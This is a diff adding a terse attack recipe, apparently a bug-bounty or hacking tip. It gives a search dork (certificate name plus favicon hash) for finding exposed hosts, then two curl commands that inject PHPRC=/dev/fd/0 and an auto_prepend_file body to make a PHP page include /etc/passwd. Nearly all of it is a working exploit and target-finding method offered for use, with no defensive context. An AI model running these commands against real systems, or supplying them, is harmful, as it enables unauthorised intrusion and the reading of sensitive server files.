@@ -1,0 +1,6 @@
+1. use this dork => Ssl.cert.subject.CN:"*.<target>.com" http.favicon.hash:2141724739 
+when u gt the ip , try this,
+
+curl -kv "https://target.com/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'
+curl -kv "https://target.com/about.php?PHPRC=/dev/fd/0" --data-binary $'auto_prepend_file="/etc/passwd"\n'
+
